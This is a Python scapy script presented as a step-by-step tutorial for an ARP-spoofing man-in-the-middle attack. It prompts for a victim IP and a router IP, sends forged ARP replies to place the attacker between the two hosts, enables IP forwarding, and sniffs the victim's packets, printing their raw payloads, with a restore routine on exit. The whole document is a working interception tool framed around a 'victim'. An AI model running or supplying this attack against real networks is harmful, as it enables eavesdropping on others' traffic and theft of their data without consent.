from scapy.all import *
import sys
import os
import time


interface = raw_input("interface: \n")
victimIP = raw_input("victim: \n")
routerIP=raw_input("router: \n")

'''

Weve imported a few modules.
We import os because we need to access /proc/ on the system, so we can do IP Forwarding and route packets from the victim to the router.

We import sys so we can do a shutdown in some try and except loops.

Finally we import scapy, which is the real powerhouse of the situation. It allows us to send/recieve/craft packets, I HIGHLY recommend you spend some time reading about it.

okay, moving on.

Now well try to get the MAC of our victim IP

'''

def MACsnag(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src

'''
we define a function called MACsnag(), which takes an IP address.
the arping function takes an ip address(or Network) and returns a list of IP/MACs, the ans, unans well think of as answered and unanswered packets.
the for loop takes the send and recieve of the answered packets, which on the next like returns the src of the [Ether] layer or the mac address.

If you dont know about packet layers, I suggest doing some reading, as it would take a bit of writing and would push the length of this post.

So now we have a function that will get our info down the road. Lets keep building.

Onto the spoofing.

'''

def spoof(routerIP, victimIP):
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)
    send(ARP(op =2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC))
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC))


'''

We first define a function called spoof() which takes two arguments, the victim and router MACs.
We then call our MACsnag() function to get the MAC addresses we need.
The next two lines are pretty simple, they call scapys send() function, saying to send an ARP packet.
The op part is the opcode, saying that is a reply, if it were 1 it would be a request.

So were telling the victim that this packet came from the router, and were telling the router that this packet came from the victim. Which from then on the victim will send to us for the router, the router will send to us for the victim, effectively putting us in the middle.

Now, this is all good and well, however, if we dont reupdate the routing tables when were done, the victim and router will continue to try to send packets through us. No bueno, that means no connection for them.

So, well write a function to restore the victim and router.

'''

def Restore(routerIP, victimIP):
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4) 
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)


    '''

    So, we define the Restore() function. this is basically the inverse of the spoof function with a slight difference. so we send ARP replies to each host.
However, youll notice the hwdst = "ff:ff:ff:ff:ff:ff", ff:ff:ff:ff:ff:ff is simply put, the everyone address, so this broadcasts the packet asking for the information of the machine at the requested IP, so in this case, the router would respond with its information and BAM now theyre back to talking to each other correctly.

Alright, so we can get MACs, spoof and restore. Now what?
Were going to write a quick function to watch the packets go by and save them to a file

'''

def sniffer():
    pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
    #wrpcap("temp.pcap", pkts)
    print pkts


'''

We made a function sniffer()
We then call scapys sniff() function on the interface we specified earlier, for a count of 10 packets.
at the end of the sniff function youll notice prn= is adding a custom action, you could pass this a seperate function you wrote if you wish, in this case we used a lambda to print out the packets source IP and MAC, followed by the packets raw load if there is one, ending with the packets destination IP.
Next we call wrpcap() to write all the packets we sniff to a .pcap file for later inspection

Alright, were almost there. Lets make it run!

'''

def MiddleMan():
    #os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") This is for Linux
    os.system('sudo sysctl -w net.inet.ip.forwarding=1 > /dev/null') #This should work for mac
	#os.system('sudo sysctl -w net.inet.ip.fw.enable=1 > /dev/null ')
    while 1:
        try:
            spoof(routerIP, victimIP)
            time.sleep(1)
            sniffer()
        except KeyboardInterrupt:
            Restore(routerIP, victimIP)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            sys.exit(1)


if __name__ == "__main__":
    MiddleMan()


